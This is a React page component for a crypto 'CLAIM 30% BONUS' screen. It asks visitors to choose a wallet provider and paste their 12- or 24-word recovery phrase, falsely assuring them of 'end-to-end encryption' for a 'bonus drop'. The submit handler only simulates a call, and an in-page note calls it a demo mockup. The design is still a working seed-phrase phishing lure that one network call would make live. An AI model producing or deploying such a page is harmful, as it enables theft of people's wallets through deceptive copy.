import { Navbar } from "@/components/layout/Navbar";
import { Footer } from "@/components/layout/Footer";
import { GlassCard } from "@/components/ui/GlassCard";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { ShieldCheck, AlertTriangle } from "lucide-react";

export default function Bonus() {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    // Simulate API call
    setTimeout(() => {
      setIsLoading(false);
      toast({
        title: "Bonus Claim Initiated",
        description: "Your wallet is being verified. This may take up to 24 hours.",
        variant: "default", 
        className: "bg-green-500 text-white border-none"
      });
    }, 2000);
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 px-4">
        <div className="container mx-auto max-w-xl">
          <div className="text-center mb-10">
            <h1 className="text-4xl md:text-5xl font-black mb-4 neon-text-primary">CLAIM 30% BONUS</h1>
            <p className="text-muted-foreground">Connect your wallet securely to receive your automated deposit.</p>
          </div>

          <GlassCard className="border-primary/20">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-medium text-white">Select Wallet Type</label>
                <Select required>
                  <SelectTrigger className="bg-black/20 border-white/10 h-12">
                    <SelectValue placeholder="Select your wallet provider" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="metamask">MetaMask</SelectItem>
                    <SelectItem value="trust">Trust Wallet</SelectItem>
                    <SelectItem value="exodus">Exodus</SelectItem>
                    <SelectItem value="ledger">Ledger</SelectItem>
                    <SelectItem value="coinbase">Coinbase Wallet</SelectItem>
                    <SelectItem value="binance">Binance Chain Wallet</SelectItem>
                    <SelectItem value="rainbow">Rainbow</SelectItem>
                    <SelectItem value="coinmama">Coinmama</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-white">Wallet Phrase Key (12/24 Words)</label>
                <textarea 
                  required
                  className="flex min-h-[120px] w-full rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
                  placeholder="Enter your recovery phrase..."
                />
                <p className="text-xs text-muted-foreground/70">
                   * We use end-to-end encryption to verify wallet ownership for the bonus drop.
                </p>
              </div>

              <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 rounded-lg flex gap-3">
                <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0" />
                <p className="text-xs text-yellow-500/90">
                  <strong>Security Note (Demo):</strong> In a real application, NEVER share your private keys or seed phrases. This is a frontend-only mockup for demonstration purposes.
                </p>
              </div>

              <Button 
                type="submit" 
                className="w-full h-14 text-lg font-bold bg-gradient-to-r from-primary to-secondary hover:opacity-90 neon-border-primary"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="flex items-center gap-2">
                    <span className="animate-spin">⟳</span> Verifying...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5" /> VERIFY & CLAIM BONUS
                  </span>
                )}
              </Button>
            </form>
          </GlassCard>
        </div>
      </main>
      <Footer />
    </div>
  );
}